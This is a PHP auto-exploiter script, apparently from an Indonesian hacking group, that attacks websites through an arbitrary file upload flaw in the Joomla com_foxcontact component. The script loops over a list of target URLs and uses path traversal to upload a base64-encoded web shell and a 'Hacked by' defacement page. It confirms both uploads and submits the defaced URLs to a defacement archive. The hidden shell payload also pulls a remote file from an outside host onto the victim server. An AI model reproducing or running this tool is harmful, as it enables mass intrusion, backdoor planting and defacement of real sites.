<?php
/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
Coded by: L0c4lh34rtz - IndoXploit
http://www.indoxploit.or.id/2017/12/joomla-component-comfoxcontact.html

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $hacker;
	private $file = [];

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOwo8aHRtbD4KPHRpdGxlPmphbmNveCBhcGxvZGVyIDwvdGl0bGU+CjxwPjw/cGhwIGVjaG8gJzxiPicucGhwX3VuYW1lKCkuJzwvYj4nOyA/Pjxicj4KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPgo8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0naWR4X2ZpbGUnPgo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPgo8L2Zvcm0+Cjw/cGhwIGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7IGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXSkpIHsgZWNobyRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXS4gJ1s8Yj5PSzwvYj5dJzsgfSBlbHNlIHsgZWNobyRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXS4gJ1s8Yj5GQUlMRUQ8L2I+JzsgfSB9ID8+Cjw/cGhwCkBpbmlfc2V0KCdvdXRwdXRfYnVmZmVyaW5nJywgMCk7CkBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOwpzZXRfdGltZV9saW1pdCgwKTsKaW5pX3NldCgnbWVtb3J5X2xpbWl0JywgJzY0TScpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7CmZ1bmN0aW9uIGh0dHBfZ2V0KCR1cmwpewokaW0gPSBjdXJsX2luaXQoJHVybCk7CmN1cmxfc2V0b3B0KCRpbSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CmN1cmxfc2V0b3B0KCRpbSwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMTApOwpjdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOwpjdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfSEVBREVSLCAwKTsKcmV0dXJuIGN1cmxfZXhlYygkaW0pOwpjdXJsX2Nsb3NlKCRpbSk7Cn0KJGNoZWNrMSA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2FkbWluaXN0cmF0b3IvZmlsZW11LnBocCIgOyAvL2xldGFrIGZpbGVtdQokdGV4dDEgPSBodHRwX2dldCgnaHR0cDovL2RvbWVuLmNvbS9maWxlLnR4dCcpOyAvL2J1YXQgamFnYSIga2FsbyBmaWxlbXUgcGVydGFtYSBpbGFuZyAKJG9wZW4xID0gZm9wZW4oJGNoZWNrMSwgJ3cnKTsKZndyaXRlKCRvcGVuMSwgJHRleHQxKTsKZmNsb3NlKCRvcGVuMSk7CmlmKGZpbGVfZXhpc3RzKCRjaGVjazEpKXsKfQo/Pg==';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5IYWNrZWQ8L3RpdGxlPg0KPGxpbmsgaHJlZj0iaHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9RmF1bmErT25lIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIj4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ii8+DQo8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iVHJlbmdnYWxlayA2ZXRhciI+DQo8bWV0YSBIVFRQLUVRVUlWPSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xIi8+DQo8bWV0YSBjb250ZW50PSJoYWNrZWQiIG5hbWU9ImRlc2NyaXB0aW9uIi8+DQo8bWV0YSBjb250ZW50PSJUcmVuZ2dhbGVrIDZldGFyLFRyZW5nZ2FsZWsgQ3liZXIgQXJteSxKYXRpbTR1IiBuYW1lPSJrZXl3b3JkcyIvPg0KPG1ldGEgY29udGVudD0iSU5ERVgsIEZPTExPVyIgbmFtZT0iUk9CT1RTIi8+DQo8bWV0YSBjb250ZW50PSJ0cmVuZ2dhbGVrNmV0YXIub3JnIiBuYW1lPSJhdXRob3IiLz4NCjxib2R5IGJnY29sb3I9IiMwMDAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHN0eWxlPSJiYWNrZ3JvdW5kOiBibGFjayAgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IC13ZWJraXQtYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsgLW1vei1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyAtby1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7IiBvbmxvYWQ9IihmdW5jdGlvbihhKXt3aW5kb3cuQ2xvdWRGbGFyZSAmYW1wOyZhbXA7IHdpbmRvdy5DbG91ZEZsYXJlLnB1c2goZnVuY3Rpb24oYil7YihbJnF1b3Q7Y2xvdWRmbGFyZS9yb2NrZXQmcXVvdDtdLGZ1bmN0aW9uKGMpe2MucHVzaChmdW5jdGlvbigpeyhmdW5jdGlvbigpe3R5cGVfdGV4dCgpfSkuY2FsbChhKX0pfSl9KX0pKHRoaXMpOyIgYm90dG9tbWFyZ2luPSIwIiByaWdodG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgdG9wbWFyZ2luPSIwIj4NCjxzdHlsZT5ib2R5e2ZvbnQtZmFtaWx5OiJjb3VyaWVyIG5ldyI7Zm9udC1zaXplOjgwJTtjb2xvcjojMjhGRTE0O30ueEJvZHl7d2lkdGg6NjYwcHg7aGVpZ2h0OjQ1MHB4O3Bvc2l0aW9uOmFic29sdXRlO3otaW5kZXg6OTt9LnNzaHtkaXNwbGF5Om5vbmU7ei1pbmRleDo5O30uc3NoQm94e2hlaWdodDozMDBweDtib3JkZXI6NHB4IHNvbGlkIHdoaXRlOy1tb3otYm9yZGVyLXJhZGl1czo0cHg7LXdlYmtpdC1ib3JkZXItcmFkaXVzOjRweDstby1ib3JkZXItcmFkaXVzOjR4Oy1raHRtbC1ib3JkZXItcmFkaXVzOjRweDtib3JkZXItcmFkaXVzOjRweDt6LWluZGV4Ojk7fS5zc2hIZWFke21hcmdpbi1ib3R0b206NXB4O2NvbG9yOmJsYWNrO2ZvbnQtd2VpZ2h0OmJvbGQ7YmFja2dyb3VuZC1jb2xvcjp3aGl0ZTtoZWlnaHQ6MjBweDt6LWluZGV4Ojk7fS5ncmVlbkJveHtwYWRkaW5nLWxlZnQ6M3B4O3Bvc2l0aW9uOmFic29sdXRlO2hlaWdodDoyMnB4O2JvcmRlcjoxcHggc29saWQgIzI4RkUxNDt6LWluZGV4Ojk7fS5waWN6e3Bvc2l0aW9uOmFic29sdXRlO3dpZHRoOjUwMHB4O2hlaWdodDo4MCU7ZGlzcGxheTpub25lO3JpZ2h0OjJweDt0b3A6MnB4O30jbWcgaW1nOmhvdmVyey13ZWJraXQtYW5pbWF0aW9uOnRyZW1lciAwLjVzIGxpbmVhciBpbmZpbml0ZTstbW96LWFuaW1hdGlvbjp0cmVtZXIgMC41cyBsaW5lYXIgaW5maW5pdGU7LW8tYW5pbWF0aW9uOnRyZW1lciAwLjVzIGxpbmVhciBpbmZpbml0ZTthbmltYXRpb246dHJlbWVyIDAuNXMgbGluZWFyIGluZmluaXRlO30ubmVvbns8IS0tY29sZXVyIGxvb3R6LS0+IGNvbG9yOmJsdWU7dGV4dC1zaGFkb3c6MCAwIDVweCByZWQsMCAwIDEwcHggcmVkLDAgMCAzMHB4IG9yYW5nZSwwIDAgNDVweCB5ZWxsb3csMCAwIDYwcHggcmVkO30ubGlrZXtib3JkZXI6NHB4IGRvdWJsZSB5ZWxsb3c7Ym94LXNoYWRvdzowcHggMnB4IDIwcHggd2hpdGU7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6OXB4O2hlaWdodDozMTBweDt9I21nIGltZ3tib3JkZXI6NHB4IGRvdWJsZSB5ZWxsb3c7Ym9yZGVyLXJhZGl1czoxMHB4O29wYWNpdHk6MC43NTstbW96LW9wYWNpdHk6MC43NTtmaWx0ZXI6YWxwaGEob3BhY2l0eT03NSk7fTwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJibGFjayI+DQoNCjxjZW50ZXI+DQoNCjxib2R5IG9uc2VsZWN0c3RhcnQ9InJldHVybiBmYWxzZSIgb25kcmFnc3RhcnQ9InJldHVybiBmYWxzZSIgb25jb250ZXh0bWVudT0icmV0dXJuIGZhbHNlIiBvbkxvYWQ9IihmdW5jdGlvbihhKXt3aW5kb3cuQ2xvdWRGbGFyZSAmYW1wOyZhbXA7IHdpbmRvdy5DbG91ZEZsYXJlLnB1c2goZnVuY3Rpb24oYil7YihbJnF1b3Q7Y2xvdWRmbGFyZS9yb2NrZXQmcXVvdDtdLGZ1bmN0aW9uKGMpe2MucHVzaChmdW5jdGlvbigpeyhmdW5jdGlvbigpe3dyaXRldGV4dCgpfSkuY2FsbChhKX0pfSl9KX0pKHRoaXMpOyI+DQo8Y2VudGVyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPg0KPGltZyBzcmM9Imh0dHBzOi8vaS5waW5pbWcuY29tLzczNngvMmUvNmUvNjIvMmU2ZTYyOGNjNmY2NTA1ZmNiNjhjYmM5ZmMxYjQxZWUtLXJlYWwtc2t1bGwtZGFyay1hcnQuanBnIiBoZWlnaHQ9IjM1MCIgd2lkdGg9IjMwMCI+PGJyPjxicj48YnI+PGJyPjxicj4NCkhhY2tlZCBieSBUcmVuZ2dhbGVrIDZldGFyIC0gSmF0aW00dSBUZWFtPGJyPi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS08YnI+DQo8YSBocmVmPSJodHRwOi8vdC5tZS91cGVsNjY2Ij5Mb3ZlIG1lID8gOlA8L2E+DQo8L3RkPg0KPC9jZW50ZXI+DQo8YnI+IDxicj48L3NwYW4+PC9kaXY+';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "xd.htm";

		$this->file->shell 		= $this->randomFileName().".php";

		/* Nick Hacker Kalian / Nick Zone -H Kalian */
		/* Pastikan dalam script deface kalian terdapat kata HACKED */
		$this->hacker  = "Patan404"; 
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/jancox aploder/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://ada.com", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);

		if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post->response)) {
			print "[+] Zone-H ($url) [OK]\n\n";
		} else {
			print "[+] Zone-H ($url) [ERROR]\n\n";
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();
	print "[+] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}
